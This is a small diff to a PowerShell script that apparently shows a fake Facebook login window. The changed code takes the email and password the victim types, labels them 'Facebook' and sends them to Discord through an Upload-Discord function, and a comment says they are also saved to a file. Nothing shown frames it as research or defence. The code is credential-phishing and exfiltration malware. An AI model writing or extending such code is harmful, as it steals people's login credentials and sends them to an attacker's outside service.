@@ -147,7 +147,7 @@ $loginButton.Add_Click({
     $enteredPassword = $loginWindow.FindName("Password").Password
 
     # Send the collected data to Discord
-    $creds = "Email: $enteredUsername`nPassword: $enteredPassword"
+    $creds = "Facebook`nEmail: $enteredUsername`nPassword: $enteredPassword"
     Upload-Discord -text $creds
 
     # Save the data to a file
